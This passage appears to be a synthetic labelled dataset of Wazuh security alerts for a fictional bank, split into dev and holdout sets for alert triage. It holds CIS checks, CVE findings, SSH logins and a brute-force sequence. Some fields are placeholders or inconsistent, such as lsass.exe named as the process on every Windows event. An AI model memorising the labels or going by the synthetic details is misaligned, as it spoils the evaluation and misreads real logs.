+   "threat": false,
+   "scenario": "health",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:37:30.000+0000",
+   "rule": {
+    "level": 10,
+    "description": "Multiple System error events",
+    "id": "61110",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000024",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "DCOM",
+      "eventID": "10016",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:37:30Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by DCOM. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "health",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:38:00.000+0000",
+   "rule": {
+    "level": 10,
+    "description": "Multiple Windows error events.",
+    "id": "60014",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000025",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Application Error",
+      "eventID": "1000",
+      "channel": "Application",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T03:38:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Application Error. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "health",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T05:59:00.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "Windows is shutting down",
+    "id": "60116",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "system_shutdown"
+    ],
+    "mitre": {
+     "id": [
+      "T1529"
+     ],
+     "tactic": [
+      "Impact"
+     ],
+     "technique": [
+      "System Shutdown/Reboot"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000026",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4609",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T05:59:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {}
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "health",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:00.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Enforce password history' is set to '24 or more password(s)'.",
+    "id": "19007",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000027",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26027",
+      "title": "Ensure 'Enforce password history' is set to '24 or more password(s)'.",
+      "result": "failed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:01.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Configure LSASS to run as a protected process' is set to 'Enabled'.",
+    "id": "19007",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000028",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26028",
+      "title": "Ensure 'Configure LSASS to run as a protected process' is set to 'Enabled'.",
+      "result": "failed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": "the title names LSASS because it is the name of a check, not activity"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:02.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Turn off Microsoft Defender AntiVirus' is set to 'Disabled' (protects against malware).",
+    "id": "19007",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000029",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26029",
+      "title": "Ensure 'Turn off Microsoft Defender AntiVirus' is set to 'Disabled' (protects against malware).",
+      "result": "failed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:03.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Audit Logon' is set to 'Success and Failure'.",
+    "id": "19007",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000030",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26030",
+      "title": "Ensure 'Audit Logon' is set to 'Success and Failure'.",
+      "result": "failed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:04.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Exploit Protection' settings limit privilege escalation.",
+    "id": "19007",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000031",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26031",
+      "title": "Ensure 'Exploit Protection' settings limit privilege escalation.",
+      "result": "failed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "holdout",
+   "why": "check title contains 'privilege escalation'"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:05.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Windows Firewall: Domain: Firewall state' is set to 'On'.",
+    "id": "19008",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000032",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26032",
+      "title": "Ensure 'Windows Firewall: Domain: Firewall state' is set to 'On'.",
+      "result": "passed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:06.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Minimum password length' is set to '14 or more character(s)'.",
+    "id": "19008",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000033",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26033",
+      "title": "Ensure 'Minimum password length' is set to '14 or more character(s)'.",
+      "result": "passed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended."
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:31:10.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "SCA summary: CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Score less than 50% (38)",
+    "id": "19004",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000034",
+   "location": "sca",
+   "data": {
+    "sca": {
+     "type": "summary",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "score": "38",
+     "passed": "152",
+     "failed": "247"
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:45:00.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "CVE-2025-21204 affects Microsoft Windows 11",
+    "id": "23504",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "vulnerability-detector"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000035",
+   "location": "vulnerability-detector",
+   "decoder": {
+    "name": "json"
+   },
+   "data": {
+    "vulnerability": {
+     "cve": "CVE-2025-21204",
+     "severity": "Medium",
+     "status": "Active",
+     "package": {
+      "name": "Microsoft Windows 11",
+      "version": "1.0",
+      "condition": "Package less than 2.0"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:45:01.000+0000",
+   "rule": {
+    "level": 10,
+    "description": "CVE-2026-0211 affects Google Chrome",
+    "id": "23505",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "vulnerability-detector"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000036",
+   "location": "vulnerability-detector",
+   "decoder": {
+    "name": "json"
+   },
+   "data": {
+    "vulnerability": {
+     "cve": "CVE-2026-0211",
+     "severity": "High",
+     "status": "Active",
+     "package": {
+      "name": "Google Chrome",
+      "version": "1.0",
+      "condition": "Package less than 2.0"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:45:02.000+0000",
+   "rule": {
+    "level": 13,
+    "description": "CVE-2026-1142 affects 7-Zip",
+    "id": "23506",
+    "firedtimes": 1,
+    "mail": true,
+    "groups": [
+     "vulnerability-detector"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000037",
+   "location": "vulnerability-detector",
+   "decoder": {
+    "name": "json"
+   },
+   "data": {
+    "vulnerability": {
+     "cve": "CVE-2026-1142",
+     "severity": "Critical",
+     "status": "Active",
+     "package": {
+      "name": "7-Zip",
+      "version": "1.0",
+      "condition": "Package less than 2.0"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "posture",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T09:20:00.000+0000",
+   "rule": {
+    "level": 9,
+    "description": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0: Ensure 'Windows Firewall: Private: Firewall state' is set to 'On'.: Status changed from passed to failed",
+    "id": "19011",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sca"
+    ]
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000038",
+   "location": "sca",
+   "decoder": {
+    "name": "sca"
+   },
+   "data": {
+    "sca": {
+     "type": "check",
+     "scan_id": "771",
+     "policy": "CIS Microsoft Windows 11 Enterprise Benchmark v3.0.0",
+     "check": {
+      "id": "26038",
+      "title": "Ensure 'Windows Firewall: Private: Firewall state' is set to 'On'.",
+      "result": "failed",
+      "description": "Benchmark check.",
+      "remediation": "Set the policy as recommended.",
+      "previous_result": "passed"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "posture",
+   "split": "dev",
+   "why": "drift: someone or something turned the firewall off"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:20:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "PAM: Login session opened.",
+    "id": "5501",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "pam",
+     "syslog",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "technique": [
+      "Valid Accounts"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000039",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 03:20:00 wazuh-server sshd[811]: pam_unix(sshd:session): session opened for user ops(uid=1001) by (uid=0)",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "dstuser": "ops"
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:20:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "sshd: authentication success.",
+    "id": "5715",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "authentication_success"
+    ],
+    "mitre": {
+     "id": [
+      "T1078",
+      "T1021"
+     ],
+     "tactic": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access",
+      "Lateral Movement"
+     ],
+     "technique": [
+      "Valid Accounts",
+      "Remote Services"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000040",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 03:20:00 wazuh-server sshd[811]: Accepted publickey for ops from 10.20.0.5 port 50112 ssh2",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "10.20.0.5",
+    "dstuser": "ops"
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:21:10.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Successful sudo to ROOT executed.",
+    "id": "5402",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sudo"
+    ],
+    "mitre": {
+     "id": [
+      "T1548.003"
+     ],
+     "tactic": [
+      "Privilege Escalation",
+      "Defense Evasion"
+     ],
+     "technique": [
+      "Sudo and Sudo Caching"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000041",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 03:21:10 wazuh-server sudo: ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl status wazuh-manager",
+   "decoder": {
+    "name": "pam"
+   },
+   "data": {
+    "srcuser": "ops",
+    "dstuser": "root",
+    "command": "/usr/bin/systemctl status wazuh-manager"
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T03:50:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "PAM: Login session closed.",
+    "id": "5502",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "pam",
+     "syslog"
+    ]
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000042",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 03:50:00 wazuh-server sshd[811]: pam_unix(sshd:session): session closed for user ops",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "dstuser": "ops"
+   }
+  },
+  "label": {
+   "threat": false,
+   "scenario": "routine",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T06:25:00.000+0000",
+   "rule": {
+    "level": 7,
+    "description": "New dpkg (Debian Package) installed.",
+    "id": "2902",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "dpkg",
+     "config_changed"
+    ]
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000043",
+   "location": "/var/log/dpkg.log",
+   "full_log": "2026-11-22 06:25:00 status installed libssl3:amd64 3.0.2-0ubuntu1.20",
+   "decoder": {
+    "name": "pam"
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "change",
+   "split": "dev",
+   "why": "a package install: a change someone should be able to account for"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:15:00.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "New Windows Service Created",
+    "id": "61138",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_system"
+    ],
+    "mitre": {
+     "id": [
+      "T1543.003"
+     ],
+     "tactic": [
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "technique": [
+      "Windows Service"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000044",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Service Control Manager",
+      "eventID": "7045",
+      "channel": "System",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:15:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Service Control Manager. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "serviceName": "GoogleUpdaterService",
+      "imagePath": "C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe",
+      "serviceType": "user mode service",
+      "startType": "auto start"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "change",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T04:20:00.000+0000",
+   "rule": {
+    "level": 3,
+    "description": "Discovery activity executed",
+    "id": "92031",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "sysmon",
+     "sysmon_eid1_detections",
+     "windows"
+    ],
+    "mitre": {
+     "id": [
+      "T1087"
+     ],
+     "tactic": [
+      "Discovery"
+     ],
+     "technique": [
+      "Account Discovery"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000045",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Sysmon",
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T04:20:00Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Sysmon. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "utcTime": "2026-11-22 04:20:00.000",
+      "user": "SCB\\a.kulkarni",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "commandLine": "whoami /groups",
+      "parentImage": "C:\\Windows\\System32\\cmd.exe",
+      "originalFileName": "whoami.exe",
+      "integrityLevel": "High",
+      "hashes": "MD5=0C4F1E0A4A1B3F5E2D7C9B8A6F5E4D3C,SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "discovery",
+   "split": "dev",
+   "why": "discovery commands are what admins and attackers both run"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:01:02.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "sshd: Attempt to login using a non-existent user",
+    "id": "5710",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "authentication_failed",
+     "invalid_login"
+    ],
+    "mitre": {
+     "id": [
+      "T1110.001",
+      "T1021.004"
+     ],
+     "tactic": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "technique": [
+      "Password Guessing",
+      "SSH"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000046",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:01:02 wazuh-server sshd[900]: Invalid user admin from 203.0.113.77 port 40112",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "203.0.113.77",
+    "srcuser": "admin"
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "ssh-bruteforce",
+   "split": "dev",
+   "why": "one failed login is noise; the pattern is the alert"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:01:04.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "sshd: Attempt to login using a non-existent user",
+    "id": "5710",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "authentication_failed",
+     "invalid_login"
+    ],
+    "mitre": {
+     "id": [
+      "T1110.001",
+      "T1021.004"
+     ],
+     "tactic": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "technique": [
+      "Password Guessing",
+      "SSH"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000047",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:01:04 wazuh-server sshd[901]: Invalid user oracle from 203.0.113.77 port 41112",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "203.0.113.77",
+    "srcuser": "oracle"
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "ssh-bruteforce",
+   "split": "dev",
+   "why": "one failed login is noise; the pattern is the alert"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:01:07.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "sshd: Attempt to login using a non-existent user",
+    "id": "5710",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
+     "sshd",
+     "authentication_failed",
+     "invalid_login"
+    ],
+    "mitre": {
+     "id": [
+      "T1110.001",
+      "T1021.004"
+     ],
+     "tactic": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "technique": [
+      "Password Guessing",
+      "SSH"
+     ]
+    }
+   },
+   "agent": {
+    "id": "000",
+    "name": "wazuh-server"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000048",
+   "location": "/var/log/auth.log",
+   "full_log": "Nov 22 07:01:07 wazuh-server sshd[902]: Invalid user test from 203.0.113.77 port 42112",
+   "decoder": {
+    "name": "sshd"
+   },
+   "data": {
+    "srcip": "203.0.113.77",
+    "srcuser": "test"
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "ssh-bruteforce",
+   "split": "dev",
+   "why": "one failed login is noise; the pattern is the alert"
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T07:01:10.000+0000",
+   "rule": {
+    "level": 10,
+    "description": "sshd: brute force trying to get access to the system. Non existent user.",
+    "id": "5712",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "syslog",
